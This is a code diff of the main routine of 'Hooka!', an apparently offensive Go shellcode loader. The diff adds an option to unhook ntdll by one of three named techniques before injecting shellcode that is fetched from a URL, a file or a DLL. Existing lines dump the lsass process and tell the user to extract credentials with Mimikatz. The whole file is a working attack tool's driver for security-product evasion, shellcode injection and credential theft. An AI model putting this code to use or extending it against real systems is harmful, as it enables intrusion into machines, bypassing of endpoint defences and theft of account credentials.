@@ -20,39 +20,44 @@ func main() {
   var err error
 
   // Parse CLI flags and retrieve values
-  sc_url, sc_file, dll_file, technique, hook_detect, _, _, base64_flag, hex_flag, test_flag, lsass := core.ParseFlags()
+  sc_url, sc_file, dll_file, technique, hook_detect, _, unhook, base64_flag, hex_flag, test_flag, lsass := core.ParseFlags()
 
   l.PrintBanner("Hooka!")
-  l.Println("      by D3Ext - v0.1")
+  l.Println(" by D3Ext - v0.1")
   time.Sleep(100 * time.Millisecond)
 
   if (sc_url == "") && (sc_file == "") && (dll_file == "") && (!hook_detect) && (!test_flag) { // Enter here if any main flag was especified
     l.Println()
     flag.PrintDefaults()
-    l.Println("\n[-] Parameters missing: provide a shellcode to inject (--file/--url/--dll), detect hooked functions (--hooks) or test program capabilities (--test)")
+    l.Println("\n[-] Parameters missing: provide a shellcode to inject (--file/--url/--dll), detect hooked functions (--hooks) or test program capabilities (--test)\n")
     os.Exit(0)
 
   } else if (sc_url != "") && (sc_file != "") && (dll_file == "") { // Check if both --url and --file flags were passed
     l.Println()
     flag.PrintDefaults()
-    l.Println("\n[-] Error: you can't use --url and --file at the same time!")
+    l.Println("\n[-] Error: you can't use --url and --file at the same time!\n")
 
   } else if (sc_url != "") && (sc_file == "") && (dll_file != "") { // Check if both --url and --dll flags were passed
     l.Println()
     flag.PrintDefaults()
-    l.Println("\n[-] Error: you can't use --url and --dll at the same time!")
+    l.Println("\n[-] Error: you can't use --url and --dll at the same time!\n")
 
   } else if (sc_url == "") && (sc_file != "") && (dll_file != "") { // Check if both --file and --dll flags were passed
     l.Println()
     flag.PrintDefaults()
-    l.Println("\n[-] Error: you can't use --file and --dll at the same time!")
+    l.Println("\n[-] Error: you can't use --file and --dll at the same time!\n")
 
   } else if (sc_url != "") && (sc_file == "") && (dll_file == "") {
 
     if (base64_flag) && (hex_flag) { // Check if both flags were passed
       l.Println()
       flag.PrintDefaults()
-      l.Println("\n[-] Error: you can't use base64 and hex encoding flag at the same time!")
+      l.Println("\n[-] Error: you can't use base64 and hex encoding flag at the same time!\n")
+      os.Exit(0)
+    }
+
+    if (unhook != 1) && (unhook != 2) && (unhook != 3) && (unhook != 0) {
+      l.Println("\n[-] Unknown unhooking technique! Allowed values: 1, 2, 3\n")
       os.Exit(0)
     }
 
@@ -94,6 +99,36 @@ func main() {
       time.Sleep(300 * time.Millisecond)
     }
 
+    // Unhook function(s)
+    if (unhook == 1) {
+      l.Println("[*] Unhooking functions via Classic technique...")
+      time.Sleep(200 * time.Millisecond)
+      err := core.ClassicUnhook(technique, "C:\\Windows\\System32\\ntdll.dll")
+      if err != nil {
+        l.Println("[-] An error has ocurred while unhooking functions!")
+        l.Fatal(err)
+      }
+
+    } else if (unhook == 2) {
+      l.Println("[*] Unhooking functions via Full Dll technique...")
+      time.Sleep(200 * time.Millisecond)
+      err := core.FullUnhook("ntdll.dll")
+      if err != nil {
+        l.Println("[-] An error has ocurred while unhooking functions!")
+        l.Fatal(err)
+      }
+
+    } else if (unhook == 3) {
+      l.Println("[*] Unhooking functions via Perun's Fart technique...")
+      time.Sleep(200 * time.Millisecond)
+      err := core.PerunsUnhook()
+      if err != nil {
+        l.Println("[-] An error has ocurred while unhooking functions!")
+        l.Fatal(err)
+      }
+
+    }
+
     if (technique != "") {
       l.Println("[*] Injecting shellcode using " + technique + " function")
     }
@@ -102,20 +137,20 @@ func main() {
     if err != nil { // Handle error
       l.Fatal(err)
     }
-    l.Println("[+] Shellcode should have been executed without errors!")
+    l.Println("[+] Shellcode should have been executed without errors!\n")
 
   } else if (sc_file != "") && (sc_url == "") && (dll_file == "") {
 
     if (base64_flag) && (hex_flag) { // Check if both flags were passed
       l.Println()
       flag.PrintDefaults()
-      l.Println("\n[-] Error: you can't use base64 and hex encoding flag at the same time!")
+      l.Println("\n[-] Error: you can't use base64 and hex encoding flag at the same time!\n")
       os.Exit(0)
     }
 
     _, err := os.Stat(sc_file) // Check if file exists
     if os.IsNotExist(err) {
-      l.Println("\n[-] Especified file doesn't exist!")
+      l.Println("\n[-] Especified file doesn't exist!\n")
       time.Sleep(100 * time.Millisecond)
       os.Exit(0)
     }
@@ -158,7 +193,37 @@ func main() {
       time.Sleep(300 * time.Millisecond)
     }
 
-    if technique != "" {
+    // Unhook function(s)
+    if (unhook == 1) {
+      l.Println("[*] Unhooking functions via Classic technique...")
+      time.Sleep(200 * time.Millisecond)
+      err := core.ClassicUnhook(technique, "C:\\Windows\\System32\\ntdll.dll")
+      if err != nil { // Handle error
+        l.Println("[-] An error has ocurred while unhooking functions!")
+        l.Fatal(err)
+      }
+
+    } else if (unhook == 2) {
+      l.Println("[*] Unhooking functions via Full Dll technique...")
+      time.Sleep(200 * time.Millisecond)
+      err := core.FullUnhook("ntdll.dll")
+      if err != nil { // Handle error
+        l.Println("[-] An error has ocurred while unhooking functions!")
+        l.Fatal(err)
+      }
+
+    } else if (unhook == 3) {
+      l.Println("[*] Unhooking functions via Perun's Fart technique...")
+      time.Sleep(200 * time.Millisecond)
+      err := core.PerunsUnhook()
+      if err != nil { // Handle error
+        l.Println("[-] An error has ocurred while unhooking functions!")
+        l.Fatal(err)
+      }
+
+    }
+
+    if (technique != "") {
       l.Println("[*] Injecting shellcode using " + technique + " technique")
     }
 
@@ -166,7 +231,7 @@ func main() {
     if err != nil { // Handle error
       l.Fatal(err)
     }
-    l.Println("[+] Shellcode should have been executed without errors!")
+    l.Println("[+] Shellcode should have been executed without errors!\n")
 
   } else if (sc_url == "") && (sc_file == "") && (dll_file != "") {
 
@@ -175,7 +240,7 @@ func main() {
 
     _, err := os.Stat(dll_filename) // Check if especified dll exists
     if os.IsNotExist(err) {
-      l.Println("\n[-] Especified DLL doesn't exists!")
+      l.Println("\n[-] Especified DLL doesn't exists!\n")
       time.Sleep(100 * time.Millisecond)
       os.Exit(0)
     }
@@ -203,28 +268,30 @@ func main() {
     if err != nil { // Handle error
       l.Fatal(err)
     }
-    l.Println("[+] Shellcode should have been executed without errors")
+    l.Println("[+] Shellcode should have been executed without errors!\n")
 
   } else if (sc_url == "") && (sc_file == "") && (dll_file == "") && (hook_detect) { // Enter here if --hooks flag was especified
 
     l.Println("\n[*] Detecting hooked functions...")
 
     all_hooks, err := core.DetectHooks() // Get all hooked functions
-    if err != nil {
+    if err != nil { // Handle error
       l.Fatal(err)
     }
     l.Println("[+] Process finished")
 
     if len(all_hooks) >= 1 { // Check if hooks array contains at least one function
-      l.Println("[*] Hooked functions:")
+      time.Sleep(200 * time.Millisecond)
+      l.Println("[*] Hooked functions:\n")
       for _, h := range all_hooks {
         l.Println(h)
       }
+      l.Println()
       time.Sleep(200 * time.Millisecond)
 
     } else {
       time.Sleep(200 * time.Millisecond)
-      l.Println("[+] No function is hooked!")
+      l.Println("[+] No function is hooked!\n")
       time.Sleep(100 * time.Millisecond)
     }
 
@@ -237,18 +304,18 @@ func main() {
     if err != nil { // Handle error
       l.Fatal(err)
     }
-    l.Println("[+] Shellcode should have been executed!")
+    l.Println("[+] Shellcode should have been executed!\n")
 
   } else if (lsass != "") { // Enter here if --lsass flag was especified
     l.Println("[*] Dumping lsass process to " + lsass)
     
     err := core.DumpLsass(lsass)
-    if err != nil {
+    if err != nil { // Handle error
       l.Println("[-] An error has ocurred, ensure to be running as admin:")
       l.Fatal(err)
     }
 
-    l.Println("[+] Process finished! Now use Mimikatz in your machine to extract credentials")
+    l.Println("[+] Process finished! Now use Mimikatz in your machine to extract credentials\n")
     time.Sleep(100 * time.Millisecond)
   }
 }
